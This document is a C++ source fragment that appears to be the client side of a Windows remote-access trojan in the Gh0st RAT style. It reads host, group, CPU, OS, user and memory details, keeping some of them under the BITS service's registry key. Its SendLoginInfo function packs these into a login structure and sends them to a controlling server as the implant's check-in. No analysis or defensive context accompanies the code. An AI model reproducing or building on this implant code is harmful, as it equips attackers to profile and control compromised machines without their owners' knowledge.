void GetHostRemark(LPTSTR lpBuffer, UINT uSize ,LPTSTR strSubKey)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,_T("Remark"), REG_SZ, lpBuffer, NULL,uSize, 0);
	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
}

void GetGroupRemark(LPTSTR lpBuffer, UINT uSize ,LPTSTR strSubKey)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,_T("Group"), REG_SZ, lpBuffer, NULL,uSize, 0);
	if (lstrlen(lpBuffer) == 0)
		lstrcat(lpBuffer,_T("Default"));
}

void GetCPU(LPTSTR lpBuffer, UINT uSize)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, _T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), _T("ProcessorNameString"), REG_SZ, lpBuffer, NULL, uSize, 0);
	if (lstrlen(lpBuffer) == 0)
		lstrcat(lpBuffer,_T("Unknown CPU"));
}

void GetOS(LPTSTR lpBuffer, UINT uSize)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), _T("ProductName"), REG_SZ, lpBuffer, NULL, uSize, 0);
	if (lstrlen(lpBuffer) == 0)
		lstrcat(lpBuffer,_T("Unknown OS"));
}

BOOL IsWow64() 
{ 
	HINSTANCE kernel32 = LoadLibrary(_T("kernel32.dll")); 
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); 
	LPFN_ISWOW64PROCESS fnIsWow64Process; 
	BOOL bIsWow64 = FALSE; 
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( kernel32,"IsWow64Process"); 
	typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID); 
	TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess"); 
	if (NULL != fnIsWow64Process) 
		fnIsWow64Process(myGetCurrentProcess(),&bIsWow64);
	if(kernel32)
		FreeLibrary(kernel32);
	return bIsWow64; 
}

int SendLoginInfo(CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	LOGININFO* LoginInfo = new LOGININFO;
	ZeroMemory(LoginInfo,sizeof(LOGININFO));
	LoginInfo->bToken = TOKEN_LOGIN;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	memcpy(&LoginInfo->IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	TCHAR strSubKey[MAX_PATH];
	wsprintf(strSubKey, _T("SYSTEM\\CurrentControlSet\\Services\\%s"), _T("BITS"));
	GetHostRemark( LoginInfo->HostName, sizeof(LoginInfo->HostName),strSubKey);
	GetGroupRemark( LoginInfo->UpGroup, sizeof(LoginInfo->UpGroup),strSubKey);
	GetCPU( LoginInfo->CPUClockMhz, sizeof(LoginInfo->CPUClockMhz));
	GetOS( LoginInfo->szOS, sizeof(LoginInfo->szOS));
	TCHAR Name[100]={0};
	DWORD dwSize1 = _countof(Name);
	GetUserName(Name,&dwSize1);
	_tcscpy(LoginInfo->szUser, Name);
	MEMORYSTATUSEX MemInfo;
	MemInfo.dwLength=sizeof(MemInfo); 
	GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo->dwMemSize = (unsigned long)strMem;
	LoginInfo->bIsWow64  = IsWow64();
	LoginInfo->dwSpeed = dwSpeed;
	nRet = pClient->Send((LPBYTE)LoginInfo, sizeof(LOGININFO));
	delete LoginInfo;
	return nRet;
}
